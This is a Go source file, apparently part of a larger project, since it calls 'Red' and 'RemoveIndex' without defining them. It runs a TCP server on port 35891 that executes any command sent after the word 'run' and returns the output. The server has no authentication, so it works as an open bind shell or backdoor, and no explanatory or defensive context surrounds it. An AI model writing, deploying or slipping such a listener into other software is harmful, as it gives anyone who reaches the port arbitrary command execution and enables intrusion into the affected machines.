package main

import(
	"fmt"
	"net"
	"os/exec"
	"strings"
	"log"
	"bytes"
)


func checkErr(err error){
	if err != nil{
		log.Fatal(err)
	}
}


func processmsg(msg string, con net.Conn){



	fmt.Println("Server got:", msg)

	cmd := strings.Fields(msg)


	switch(cmd[0]){

	case "run":

		com := RemoveIndex(cmd, 0)

		coml := com[0]

		args := RemoveIndex(com, 0)

		out, err := exec.Command(coml, args...).Output()


		con.Write([]byte(out))

		checkErr(err)




	default:
		con.Write([]byte(Red + "Invalid command " + cmd[0]))
	}

	

}



func main(){

	lis, err := net.Listen("tcp", ":35891")

	checkErr(err)


	for {


		con, err := lis.Accept()
		

		checkErr(err)
	
		for {
			buf := make([]byte, 4096)
			_, err := con.Read(buf)
			buf = bytes.Trim(buf, "\x00")
			checkErr(err)
			go processmsg(string(buf), con)
			
	    }		
}




}